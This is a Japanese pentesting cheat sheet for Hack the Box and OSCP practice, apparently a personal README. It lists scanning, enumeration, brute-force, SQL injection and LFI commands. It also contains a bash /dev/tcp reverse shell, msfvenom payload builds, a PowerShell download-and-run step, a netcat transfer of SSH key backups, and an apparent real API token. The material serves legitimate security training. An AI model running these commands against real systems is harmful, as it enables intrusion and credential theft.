## CheetSheet

Hack the Box の攻略や、OSCP 取得を目指すためのチートシートです。
悪用厳禁でお願いします><

日々更新していきます。

## 目次


- [Network Scan](#Network_scan)
  - [Nmap](#nmap)
  - [AutoRecon](#autorecon)
  - [RustScan](#rustscan)
- [偵察](#偵察)
  - [HTTP](#http)
  - [SSH](#ssh)
  - [SMB](#smb)
  - [DNS](#dns)
- [Web Scan](#Web_scan)
  - [ffuf](#ffuf)
  - [gobuster](#gobuster)
  - [dirb](#dirb)
  - [Nikto](#Nikto)
  - [davtest](#davtest)
  - [WPScan](#WPScan)
- [侵入](#侵入)
  - [reverse_shell](#reverse_shell)
    - [PayloadAllTheThings](#PayloadAllTheThings)
    - [msfvenom_reverse_shell](#msfvenom_reverse_shell)
      - Windows(meterpreter)
      - Windows(netcatなど)
      - Linux
      - ASP(msfvenom)
    - [Handlers](#Handlers)
- [特権エスカレーション](#特権エスカレーション)
  - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))
  - [Linpeas.sh](#Linpeas.sh)
  - [LinEnum](#LinEnum)
  - [PSPY](#PSPY)
  - [GTFOBins](#GTFOBins)
- [セキュリティ診断ツール](#セキュリティ診断ツール)
  - [Burp](#burp)
- [パスワードクラック](#パスワードクラック)
  - hydra
  - John the Ripper
  - hashcat
- [SQL injection](#SQLインジェクション)
- [LFI](#LFI)
- [リバースエンジニアリング](#リバースエンジニアリング)
- [便利コマンド](#便利コマンド)

    
  


# Network_scan

### TLDL;

1. nmapAutomator

```
nmapAutomator.sh 10.10.10.9 All

```

2. AutoRecon

```

./Autorecon.sh 10.10.10.9

```


### Nmap

オプションは、[こちら](https://www.checksite.jp/nmap-command-option/) がわかりやすい

基本コマンド

```
nmap -Pn -A 10.10.10.11

-Pn : ICMPのみでなく80,443番ポートにもTCPパケットを送り、同セグメントではARPも送信しホストの存在を判断
-A : OSの種類とそのバージョンを検知


nmap -sV -sC -Pn -oN sample.txt 10.10.10.5

-sC : デフォルトスクリプトでスキャン
-sV : バージョン検出
-oN : 通常出力
```

他に

```

nmap -sV -O -F --version-light 10.10.10.3


-sV: Probe open ports to determine service/version info
-O: Enable OS detection
-F: Fast mode - Scan fewer ports than the default scan
--version-light: Limit to most likely probes (intensity 2)


・集中して大量にみたいときは、
nmap -A -v 10.10.10.3

-v  冗長性をあげる

・早く結果を見たい
nmap -Pn -T4 -A -v 10.10.10.3

-T2:
polite
スキャン速度を落とす

-T3:
normal
デフォルト

-T4:
aggressive
スキャン速度を上げる

```

 known vulnerabilitiesに対して、調査したいとき

```
ex: port 445 に対して、

nmap -Pn -p 445 --script vuln 10.10.10.4

-p: Set destination port(s)

445: The open port we've discovered earlier

--script vuln: Check for specific known vulnerabilities and generally only report results if they are found
```

[参考](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)


### Autorecon

[リンク](https://github.com/Tib3rius/AutoRecon)

AutoReconは、まずTCPのデフォルト1000ポートスキャンのNmapScanを実行し、そこで見つかったサービスに対して、個別にNmapのVulnスクリプトやNikto、enum4linuxなどを実行する。
同時並行でTCP fullNmapScanも実行し、そこで新たに見つかったサービスに対してもさらにNmapなどを実行してくれる。


### RustScan

Nmapのスキャンを高速化したRust製ポートスキャナ

Nmapで17分かかる処理を1分以内に抑える高速化を実現している

```
 rustscan -a 10.10.10.197

```

# 偵察 

- 着目すべきポート

```

80/TCP:HTTP, 443/TCP:HTTPS
　->各ページにある脆弱性を使える

135/TCP:MSRPC, 139/TCP:NetBios-SSN, 445/TCP:Microsoft-DS
　->Eternal Blueなどが使える

21/TCP:FTP
　->anonymousユーザなどでファイルの中身を見たり、アップロードしたりできる

22/TCP:SSH
　->BruteForceにより突破できるかも

389, 636:LDAP
　->ActiveDirectoryに関する脆弱性があるかも
 ```


# HTTP

### minimum todo

```

- robots.txt，sitemap.xmlの確認
- サブドメインの列挙
- ディレクトリスキャナーの使用(ffuf, gobuster, dirb, nikto はmust)
- CMSの特定
- ログインの試行
  - デフォルトパスワードの入力
  - パスワード推測
  - SQLインジェクションの試行
  - Webサイト上にある情報からユーザー/パスワードリストの作成
  - ブルートフォース
- BurpSuiteを用いてWebの挙動の確認
- URLを見て、LFIの脆弱性が無いか確認
- upload機構がある場合、バイパス方法の模索
- 掲載されている画像にヒントが無いか確認

```

# SSH

### SCP
カレントディレクトリにsecret.zipをダウンロード

```
scp charix@10.10.10.84:/home/charix/secret.zip .

```


### フォワーディング

```
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84

```


### ssh のid_rsa が暗号化されてる時

```

python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa > ~/Desktop/htb/brainfuck/ssh-key
john --wordlist=/usr/share/wordlists/rockyou.txt ssh-key

```

### ssh-keygen

```
ssh-keygen -t rsa -f id_rsa
chmod 600 id_rsa
```
- -t...暗号の種類(ed25519,rsaなど)
- -b...ビット数の固定(-t rsa -b 4096など)
- -f...ファイル名(id_????の?部分)


# SMB

Port: 139, 445

### minimum Todo

```

// SMBによるOSの検出や列挙(smb-os-discovery)
nmap -v -p 139, 445 --script=smb-os-discovery <target ip>

// SMBプロトコルの既知の脆弱性をチェックする場合
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <target ip>

// 匿名ログインが有効になっているか確認
smbclient -N -L <target ip>

// WindowsおよびSambaホストからのデータを列挙
enum4linux -U -o <target ip>

enum4linux -S <target ip>

enum4linux -P <target ip>

- -U...ユーザリスト取得
- -o...OS情報取得
- -S...sharelist取得
- -P...password policy情報取得

```


# DNS

Port: 53

### ドメイン名の特定
DNSサーバー = 10.10.10.13  
ドメイン名を調べたいIPアドレス = 10.10.10.13  
10.10.10.13 = ns1.cronos.htb
```
┌──(kali㉿kali)-[~]
└─$ nslookup
> server 10.10.10.13　# DNSサーバーの指定
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13　# ドメイン名を知りたいIPアドレスの指定
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
```

### サブドメインの列挙
#### DNSゾーン転送
権威DNSサーバの設定不備によってゾーン情報を取得できることがある。  
これによりサーバーの名前、アドレス、機能などを調べることができる。
```
dig axfr cronos.htb @10.10.10.13
```
```
host -l <domain name> <dns server address>
```

#### DNSRecon
DNS列挙スクリプト。  
サブドメインの列挙。(ゾーン転送とブルートフォース)
```
1.kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```
- -d...ドメイン名の指定
- -t...実行する列挙の種類(1つ目はゾーン転送)
- -t...実行する列挙の種類(2つ目はブルートフォース)
- -D...サブドメイン文字列を含むワードリストファイルの指定

#### DNSmap
サブドメインの列挙。(ブルートフォース)
```
┌──(root💀kali)-[/home/kali/htb/boxes/Cronos]
└─# dnsmap cronos.htb -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt                                                                127 ⨯
dnsmap 0.35 - DNS Network Mapper

[+] searching (sub)domains for cronos.htb using /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
[+] using maximum random delay of 10 millisecond(s) between requests

www.cronos.htb
IP address #1: 10.10.10.13
[+] warning: internal IP address disclosed

admin.cronos.htb
IP address #1: 10.10.10.13
[+] warning: internal IP address disclosed
```


# Web_scan

ファジングを高速に、簡便にという意味が込められたWEBファジングツール

### ffuf

[公式](https://github.com/ffuf/ffuf)

[解説記事](https://jpn.nec.com/cybersecurity/blog/210604/index.html)

```

ffuf -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 

```

### gobuster

[リンク](https://tools.kali.org/web-applications/gobuster)
ディレクトリスキャナー。  
隠されたディレクトリや公開範囲が間違えて設定されているものはないかを調べるために使用。

```
gobuster dir -t 100 -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o <output filename>
```

- dir...ディレクトリ総当たり
- -t...スレッド数
- -u...URL指定
- -w...wordlistの指定
- -o...ファイル出力
- -x...拡張子指定


```
実際の使用例
gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o blocky_gobuster

```

### dirb 

[リンク](https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86)

```
　dirb http://172.17.0.2/mutillidae

 DIRB IS a Web Content Scanner.  It  looks  for  existing
 (and/or  hidden)  Web  Objects. 
 It  basically  works by launching a  dictionary  basesd  attack 
 against  a  web server and analizing the response.

```

### Nikto

[リンク](https://kaworu.jpn.org/security/Nikto)

Web 脆弱性スキャナ。
任意のWebサーバー（Apache、Nginx、IHS、OHS、Litespeedなど）で使用できる。
Webサイトのセキュリティ上の欠陥を識別して、見つかった各問題の詳細な参照を提供する。

```
nikto -h <target url> -Format txt -o <output filename>

-h...url指定
-Format...出力するファイルの拡張子を指定
-o...ファイルへ出力する
-ssl...SSLを使用するサイトで使用


ex): nikto -h http://10.10.10.15

```


### davtest

[リンク](https://tools.kali.org/web-applications/davtest)

DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.

```

davtest --url 10.10.10.14   

```


### WPScan
WordPressの脆弱性診断ツール。

```
wpscan -url <target url> -e u -t -vp --log <output filename>
```

- -url...対象のURL指定
- -e u...usernameの列挙
- -t...テーマを列挙
- -vp...脆弱性のあるプラグインを列挙
- --log...ファイル出力


```
実際の使用例

 wpscan --url 10.10.10.37 -e u
```

API-token を設定することで、WordPress脆弱性データをリアルタイムで取得して検出できる。

token取得は、[こちら](https://wpscan.com/profile)から

```

wpscan --url http://XXXXXX/WordPress/ -e vp --api-token xxxxxxxxxxxxxxxxxxxxxxxx


ex:
wpscan --url 10.10.10.17 -e u,vp --api-token KDuAhQpTshtAEPxDLNZLiWrkszFxb8kf8t6a3IR6RKw


```

[参考記事](https://qiita.com/koujimatsuda11/items/d49e8642dea1a1b0d067)
[実例machine](https://ranakhalil101.medium.com/hack-the-box-brainfuck-writeup-w-o-metasploit-5075c0c55e93)

# 侵入

## reverse_shell


[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

reverse_shell 全部乗ってて、大変便利


#### msfvenom_reverse_shell

[CheetSheet](https://github.com/frizb/MSF-Venom-Cheatsheet)

#### Windows(meterpreter)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```

#### bash
```
bash -i >& /dev/tcp/[url]/[port] 0>&1

ex: bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
```
better shell をとるのに使った　[リンク](https://codemonkeyism.co.uk/htb-shocker/)


#### Windows(netcatなど)


msfvenom で payload 作成

```

msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe

````

powershell で download

```

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.27.249:8000/reverse.exe','reverse.exe')"


```

metasploit で multi/handler を待ち構えて、ダウンロードしたファイルを実行

```
powershell "Start-Process "reverse.exe"

```

#### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
```

#### ASP(msfvenom)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
```


#### Handlers
```
use exploit/multi/handler
set payload <payload>   (set payload windows/meterpreter/reverse_tcp、　set payload linux/x86/meterpreter/reverse_tcp など)
set LHOST <ip address>
set LPORT <port number>
run
```


# 特権エスカレーション基本戦略 [Linux]

[毎回必ず見る資料](https://xorond.com/posts/2020/08/linux-privilege-escalation-basics/)

[上記、簡易日本語版](https://syachineko.hatenablog.com/entry/2020/09/07/213646)

[その他資料: HackTricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)


### minimum todo



- Linux Distribution, Kernel version, cpu architecture の確認

```
cat /etc/*issue # linux distribution
cat /etc/*release # linux distribution
uname -a # hostname, kernel version, cpu architecture (32-bit vs. 64-bit)

uname がない場合は
dmesg | head -n1 
```

- network の確認

```

cat /etc/network/interfaces # show network config
cat /etc/sysconfig/network # show network config
iptables -xvL # show firewall rules
netstat -antpl # which ports and connections are services exposing?
ss -antpl # if 'netstat' doesn't exist

```


- 特権アクセスの確認

```
cat /etc/sudoers # can we read? which users have sudo privileges?
sudo -l # can we use sudo? do we need a password?
ls -al /root # can we read /root?
ls -alR /home # check permissions for /home directories
```

- SUID binaries と capabilitiesを探す

```
find / -writable -type d 2>/dev/null # show writable folders
find / -writable -type f 2>/dev/null # show writable files
find / -perm -4000 -type f 2>/dev/null # search system for suid files
find / -perm -u=s -type f 2>/dev/null

getcap -r / 2>/dev/null 

ex: これで、python がでてきたら。

python -c 'import os; os.setuid(0); os.system("/bin/bash")'

```

上記でpython 以外が出てきたら、[gtfobins](https://gtfobins.github.io/) から、該当のコマンドを探す。

- ある特定のファイルが定期実行されているか？

```
cat /etc/crontab 
cat /var/log/syslog

```

- あやしいプロセスはないか？

```
ps aux | grep root 
ps aux | grep <user_name> 
ps -ef | grep <process_name> 
```


- その他

```

// etc配下のファイルにある文字列列挙
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null 
grep -Ri password $(find /etc -name '*.conf' 2>/dev/null) 

// show installed packages and versions
dpkg -l 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/" 


// 環境変数にキーやパスワードがあったり、隠れたbinファイルをPATHで見つける
echo $PATH # current value of PATH
env # display environment information


which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 

ls /dev 2>/dev/null | grep -i "sd" 

cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null 
```



# 特権エスカレーション基本戦略 (Windows)

[毎回必ず見る資料](https://xorond.com/posts/2021/04/windows-local-privilege-escalation/)


[その他資料: HackTricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)



systeminfo で、OS name, OS version をcheck.

hotfix で、update がされているか確認。

```
ex: 

OS Name:                Microsoft Windows Server 2008 R2 Datacenter 
OS Version:             6.1.7600 N/A Build 7600
HotFix:                 N/A

```


[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) を使う

```

./windows-exploit-suggester.py --update

systeminfo の内容をコピーし、systeminfo.txt をつくる
その後、以下のようなコマンドをうつ

./windows-exploit-suggester.py --database 2021-07-18-mssb.xls --systeminfo ~/hackTheBox/bastard/sysinfo.txt

```

hit したものを、github で検索たり、
[チートシート](https://kakyouim.hatenablog.com/entry/2020/05/27/010807)　で検索。


[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

ex: [MS-059](https://medium.com/@pkhadka56/hackthebox-devel-windows-46763fdd5720)


## metasploit(local_exploit_suggester)

[https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)

meterpreterでシェルを手に入れている場合、local_exploit_suggesterを使うことで、特権昇格に使える exploit を探すことができる

```jsx
background

use post/multi/recon/local_exploit_suggester
```

```
session を interactive に戻す時
sessions -i 1

```

access denied の時、プロセスが原因？

ps　で root 権限で動いているプロセスを確認し、
[migrate コマンド](https://security.stackexchange.com/questions/90578/how-does-process-migration-work-in-meterpreter)使う  

```
migrate 1836

meterpreterプロンプト下でmigrateコマンドを使うことで、バックドアを既存のプロセスに統合させることが出来る
```


## Linpeas.sh

[リンク](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

・[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux local Privilege Escalation Awesome Script (.sh)

```

実行：
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh


```


LinPEAS で不十分な時は、[linux-smart-enumeration(lse.sh)](https://github.com/diego-treitos/linux-smart-enumeration) 検討する。

・[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - Windows local Privilege Escalation Awesome Script (C#.exe and .bat)


## LinEnum

権限昇格が行える箇所がないかチェックするシェルスクリプト

[Linux 権限昇格ツール解説一覧](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/)

[Github](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

[リンク](https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/)

[machine](https://medium.com/swlh/hack-the-box-cronos-writeup-w-o-metasploit-7b9453e557d0)


## コマンド

```
uname -a

cat /etc/*release

```

<img width="384" alt="スクリーンショット 2021-01-28 17 39 05" src="https://user-images.githubusercontent.com/39001773/120716155-970fd080-c500-11eb-8d10-b4e7ed95910b.png">


で情報を掴み、exproit db で、local priviledge escalation などを探す。



## PSPY

[リンク](https://github.com/DominicBreuker/pspy)

実行しているプロセスをダンプしてくれる。

linpeas.shなどでps auxだけでは確認できないものも確認できる

[使い方](https://vk9-sec.com/how-to-enumerate-services-in-use-with-pspy/)


## GTFOBins

[リンク](https://gtfobins.github.io/)

ローカルのセキュリティ制限を回避する、バイナリ集

見慣れないコマンドがあったら、こちらから探す。 
(machine では、ここから、jounralctl, python　検索して root 奪取した)



# セキュリティ診断ツール

### Burp

[設定方法](https://www.as-lab.net/howto-use-localproxy/)
[リンク](https://persol-tech-s.co.jp/corporate/security/article.html?id=10)

ブラウザとサーバ間のHTTP通信をキャプチャし、通信内容を閲覧および改竄できるツール
BurpのProxy機能とはWebアプリケーションの通信でサーバにリクエストを送信する際に、BurpがHTTP通信をキャプチャして
通信内容の閲覧や通信内容の書き換えができる機能。

なぜ、このツールを使うか？

```
もちろんブラウザ上から入力フォームやGETパラメータに脆弱性を判定する診断データを入力して
脆弱性が存在するかチェックする事もできますが、Cookieやhiddenパラメータなどは画面上からでは
診断値を挿入できず、また脆弱性の有無はレスポンスヘッダやレスポンスボディ(HTMLソースなど)を見て判定するため、
ブラウザ上からでは効率よくチェックが行えません。
そのためWebアプリケーションセキュリティ診断ではプロキシツールを使用して作業を行います
```

実践例:

```
Proxy → Option で、
アドレス、port、redirect 先のアドレスとport(nmap で開いていたport)を記入

127.0.0.1:1212  redirect: 10.10.10.56:80

curl http://127.0.0.1:1212/cgi-bin/user.sh

これで、intercept　される

```

# パスワードクラック


### Hydra

[公式リンク](https://tools.kali.org/password-attacks/hydra)
SSHやFTPなどのサービスや、webアプリのログインフォーム(Basic認証)に対して攻撃が出来る。(ssh, ftp, http, imap, pop3)
攻撃時は、あらかじめ攻撃する値を記載したファイルを利用することが出来る

[参考記事1](https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux)


[参考記事2](https://medium.com/swlh/hack-the-box-cronos-writeup-w-o-metasploit-7b9453e557d0)


```
hydra -l <username or user.txt> -p <password or password.txt> 192.168.56.1 -t 4 ssh

・-l single user parameter
・-t は並列処理のタスク数宇
```

ex (ftp):
```
・username も password もわからない時。
hydra -L user.lst -P pass.lst -t 16 ターゲットIP ftp
hydra -L user.lst -P pass.lst -t 8 ターゲットIP ftp

・username わかってる時。
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
hydra -l userlist.txt -P passwordlist.txt 192.168.0.107 ft
```

ex (ssh)
```
hydra -L user.lst -P pass.lst -t 4 ターゲットIP ssh

```

- crunch コマンドで、wordlist を作れる

```
crunch <最小の文字数> <最大の文字数> <オプション><文字候補>

ex: 

最小1文字、最大で6文字のパスワードで"a", "k", "n", "s"の4文字から抽出したパスワードを"wordlist"と言う名前のファイルに格納します。
crunch 1 6 akns -o wordlists

1-3文字で、0-9 のパスワード
crunch 1 3 0123456789

/home/kali に作成
crunch 3 3 12345 >> /home/kali/pass.txt
crunch 3 3 12345 -o pass.txt (これでもおk、pwd が /home/kali の場合)

/usr/share/wordlists に作成 (巨大なファイルになるため、実行要注意)
crunch 3 5 0123456789abcdefghijklmnopqrstuvwxyz >> /usr/share/wordlists/rockyou.txt
```


### John the Ripper

[リンク](https://nekotosec.com/try-using-john-the-ripper/)

### hashcat

[hash analyzer](https://www.tunnelsup.com/hash-analyzer/) でhash の type を調べる。

[free password hash cracker](https://crackstation.net/) で、crack できるかチェック、だめそうなら、以下の hashcat を考える。

[リンク1](https://www.iestudy.work/entry/2020/11/20/215526)

[リンク2](https://hiziriai.hatenablog.com/entry/2018/09/03/103116)

hashcatはパスワードクラックのツール。

hashcatで行うパスワードクラックは稼働しているシステムに対してアカウントがロックされるまでログイン試行を行うようなものではなく、

パスワードのハッシュ値から元のパスワードを割り出すもの。

JohnTheRipperだとハッシュファイルを作成して形式を合わせる必要があってやや面倒。 

hashcatだとハッシュ値を直接引数に渡せて便利。

```
基本的には-mオプションでハッシュ形式の指定、-aオプションで攻撃モードの指定、そしてハッシュ値を渡す。 

結果の表示には--showオプションを使用する。

hashcat -a 3 -m 0 5d41402abc4b2a76b9719d911017c592 --show

# -m 0: md5
# -a 3: ブルートフォース
# hashcat --helpでハッシュの種類のIDが見れる

```

### FcrackZip

[リンク](https://www.geeksforgeeks.org/fcrackzip-tool-crack-a-zip-file-password-in-kali-linux/)

zipファイルへのパスワードに対し、総当り攻撃してくれるアプリ


```

fcrackzip -u -l 1-5 hoge.txt

u: unzip
l: 文字数

```

事例machine: [node](https://ranakhalil101.medium.com/hack-the-box-node-writeup-w-o-metasploit-3dfb48ee4a9)

```

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup

-D: select dictionary mode
-p: password file

```


# SQLインジェクション

[CheetSheet1](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

[CheetSheet2](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections)

[リンク](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ja-JP.md)

```

sqlmap -u 'http://localhost:5000/users?name=Alice' --dump

u: target url 
dump:  脆弱性があった時に、DB の内容をdumpする



パラメータをテストするときは --data オプションを使う。

sqlmap -u 'http://localhost:5000/users' --data 'name=Alice' --dump
```

[実例machine](https://medium.com/@zlkidda/hack-the-box-popcorn-11f5c7f77f5e)

ログインとパスワードの入力が必要な画面で、

 ```
 sqlmap -u http://10.10.10.6/torrent/login.php --data="password=test&username=test" --method POST --dbms MySQL --thread=5
 ```

している

## LFI

```
http://<url>/script.php?page=../../../../../../../../etc/passwd
http://<url>/script.php?page=../../../../../../../../etc/hosts
```

Examples:

```
http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
```
  
  
[ライブラリ](https://github.com/takabaya-shi/LFI2RCE)

```
python lfi2rce.py --linux 10.10.10.84 /browse.php?file=../../../../../..  --error "failed to open stream" -v

```

- LFIを利用して読み取りを狙うファイル:

Linux

```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
```


Windows

```
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/S
```

## リバースエンジニアリング

### radare2

[公式](https://github.com/radareorg/radare2)

[解説記事1(基礎)](https://www.bioerrorlog.work/entry/reverse-engineering-ep5-radare2)

[解説記事2(応用)](https://takuzoo3868.hatenablog.com/entry/radare2_love)


```

$ radare2 rev100

- 表層解析
[0x080483a0]> iI   # i: informationコマンド、import,export,string情報をえる
[0x080483a0]> ii  
[0x080483a0]> iE   
[0x080483a0]> iz   

- 静的解析
[0x080483a0]> aaa # autoname function"をすべて解析するコマンド
[0x080483a0]> afl # main関数が見つかる
[0x080483a0]> s main  # s(seek)コマンドでmain関数に移動
[0x0804849d]> pdc # 逆アセンブル(C言語like  pdf でアセンブリ言語にできる)

[CTF 問題](https://www.serotoninpower.club/archives/894/#q21-reversing-reversing-easy)

```


# 便利コマンド

### searchsploit -m で、

- searchsploit -m

exploit を current directory へ copy

```
─$ searchsploit PRTG             
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                       | windows/webapps/46527.sh
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                   | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                    | java/webapps/34108.txt


searchsploit -m windows/webapps/46527.sh

  -m, --mirror   [EDB-ID]    Mirror (aka copies) an exploit to the current working directory.

```

- searchsploit -x

```
searchsploit -x windows/remote/41738.py
-x エクスプロイトの中身を見る
```

### シェル整形

[コマンド 一覧](https://netsec.ws/?p=337)


[良記事](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

![71A18974-3465-4E7F-B7FA-E875BFA88A1C](https://user-images.githubusercontent.com/39001773/122586864-1fad7580-d098-11eb-877a-2be7f865fc62.png)



```
python -c 'import pty; pty.spawn("/bin/bash")'
```

-c: command
              Specify  the  command  to  execute.

pty: pty モジュールは擬似端末(他のプロセスを実行してその制御をしている端末をプログラムで読み書きする)
     を制御する操作を定義

pty.spawn: プロセスを生成して制御端末を現在のプロセスの標準入出力に接続する。
            これは制御端末を読もうとするプログラムをごまかすために利用される。
            

```

python -c 'import pty; pty.spawn("/bin/bash")'

ctrl + z

stty raw -echo; fg
enter


・TERM variable not set と言われたら・・・
kali terminal で、

echo $TERM  (example response: xterm-256color)
侵入先のshellで、  export TERM=xterm-256color

```


### ファイル探索

Windws:

```
search -f user.txt
```

### Windows コマンド集
[リンク](https://windows.command-ref.com/cmd-dir.html)


### root 権限か確かめる

```

sudo id 
sudo groups

・sudo -l 
-l:	sudoを実行するユーザーに許可されているコマンドを一覧表示する。

・root になる
sudo su
su: switch user

sudo -i  でもできる
i: rootユーザーのデフォルトのシェルをログインシェルとして実行する

```

### python のlibrary がない

```
ex: impacket
 
github のreleases へいき、
wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz

tar -zxvf impacket-0.9.21.tar.gz
cd impacket-0.9.21
pip install .

```


### PsExec
コマンドラインを、リモートで実行できる。
[リンク](https://medium.com/@jjlovesstudying/windows-version-of-ssh-using-psexec-bff7942db91b)


# その他

- nc でファイル転送したい

[リンク]（https://eel3.hatenablog.com/entry/20160422/1461336229）

```

ex:

kali側:
nc -lvnp 1337 > backup_ssh.tgz

進入先のサーバー側:
nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz

```



- Windows で user.txt を探したい

```
where /r . user.txt

```

- github のremote のコードを、local に落としたい。

→ 欲しいディレクトリにあるファイルに移動
→ raw をクリック
→ ex: wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh



- 改行などがうまく表示できていない時

/bin/sh^M : bad interpreter: No such file or directory 

`dos2unix ファイル名`

